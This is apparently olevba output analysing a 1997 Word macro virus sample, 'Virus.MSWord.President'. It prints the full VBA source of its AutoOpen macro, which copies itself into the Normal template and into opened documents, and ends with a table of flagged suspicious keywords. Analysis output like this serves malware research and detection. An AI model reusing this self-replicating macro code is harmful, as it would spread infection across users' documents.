olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.President-8c3c001a91d3ead63f455371e94e990ea4a447ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.President-8c3c001a91d3ead63f455371e94e990ea4a447ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.President-8c3c001a91d3ead63f455371e94e990ea4a447ec - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim NJ$
Dim NameF$
Dim i
Dim inst
Dim NameF2$
Dim inst2
Dim Copyright$

'Èíñòàëëÿöèÿ
    NJ$ = "President"
    NameF$ = WordBasic.[FileName$]()
    For i = 1 To WordBasic.CountMacros(0, 0)
        If WordBasic.[MacroName$](i, 0, 0) = NJ$ Then
                inst = 1
        End If
    Next i
    If inst = 0 Then
        WordBasic.MacroCopy NameF$ + ":AutoOpen", "AutoOpen"
        WordBasic.MacroCopy NameF$ + ":" + NJ$, NJ$
    End If

'Ðàçìíîæåíèå
    NameF2$ = WordBasic.[FileName$]()
    For i = 1 To WordBasic.CountMacros(1, 0)
        If WordBasic.[MacroName$](i, 1, 0) = NJ$ Then
                inst2 = 1
        End If
    Next i
    If inst2 = 0 Then
        WordBasic.FileSaveAs Name:=NameF2$, Format:=1
        WordBasic.MacroCopy "Normal:AutoOpen", NameF2$ + ":AutoOpen"
        WordBasic.MacroCopy "Normal:" + NJ$, NameF2$ + ":" + NJ$
        WordBasic.FileSave
    End If

'Âåñåëûå äåéñòâèÿ
    WordBasic.ToolsMacro Name:=NJ$, Run:=1
    Copyright$ = "(C) 1997 Mr. President"

End Sub
-------------------------------------------------------------------------------
VBA MACRO President.bas 
in file: Virus.MSWord.President-8c3c001a91d3ead63f455371e94e990ea4a447ec - OLE stream: 'Macros/VBA/President'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

